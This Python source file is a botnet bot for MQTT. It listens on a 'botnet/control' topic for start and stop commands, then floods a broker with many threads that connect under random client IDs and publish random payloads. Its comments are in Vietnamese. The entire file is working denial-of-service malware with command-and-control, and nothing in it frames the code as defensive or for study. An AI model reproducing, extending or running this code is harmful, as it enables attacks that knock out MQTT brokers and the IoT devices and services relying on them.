import paho.mqtt.client as mqtt
import threading
import time
import random
import string

BROKER_IP = 'broker-ip'
BROKER_PORT = 1883
BOT_CONTROL_TOPIC = "botnet/control"
FLOOD_TOPICS = ["test/topic1", "test/topic2", "data/stream", "sensor/readings"]

running = False
rate = 50  # số luồng mặc định

def random_client_id(length=12):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def random_payload(size=100):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def flood_client():
    global running, rate

    while True:
        if running:
            threads = []
            for _ in range(rate):
                t = threading.Thread(target=send_messages)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
        else:
            time.sleep(1)

def send_messages():
    client_id = random_client_id()
    client = mqtt.Client(client_id=client_id)
    try:
        client.connect(BROKER_IP, BROKER_PORT, 30)
        client.loop_start()
        for _ in range(20):  # gửi 20 messages 1 lượt
            topic = random.choice(FLOOD_TOPICS)
            payload = random_payload(random.randint(50, 150))
            client.publish(topic, payload)
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        print(f"Error sending message: {e}")

def on_message(client, userdata, msg):
    global running, rate
    message = msg.payload.decode()
    print(f"Received control command: {message}")
    # Ví dụ lệnh dạng: start:100 hoặc stop
    if message.startswith('start:'):
        running = True
        try:
            rate = int(message.split(':')[1])
        except:
            pass
        print(f"Flood started with rate {rate}")
    elif message == 'stop':
        running = False
        print("Flood stopped")

def main():
    client = mqtt.Client(client_id=random_client_id())
    client.on_message = on_message
    client.connect(BROKER_IP, BROKER_PORT, 30)
    client.subscribe(BOT_CONTROL_TOPIC)
    client.loop_start()

    flood_thread = threading.Thread(target=flood_client)
    flood_thread.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
